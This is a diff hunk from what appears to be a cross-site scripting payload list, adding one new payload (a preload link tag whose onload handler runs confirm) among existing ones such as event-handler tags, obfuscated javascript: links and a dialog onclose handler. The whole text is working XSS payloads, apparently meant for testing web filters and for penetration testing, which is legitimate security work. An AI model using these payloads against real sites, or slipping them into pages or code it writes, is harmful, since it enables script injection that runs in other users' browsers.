@@ -200,6 +200,7 @@ top[8680439..toString(30)](90)
 <div onmousemove="alert(200)" src="xxxx">
 <a href=javascript:/*XYZ*/XYZ:javascript:alert(201)>Test_201</a>
 <a href=javascript:/**/XYZ:alert(202)>Test_202</a>
+<link rel='preload' href='#' as='script' onload='confirm(203)'>
 '';!--"<XSS>=&{()}
 ============================================rafaybaloch.txt====================================================================================
 <dialog open="" onclose="alert(1)"><form method="dialog"><button>Close me!</button></form></dialog>
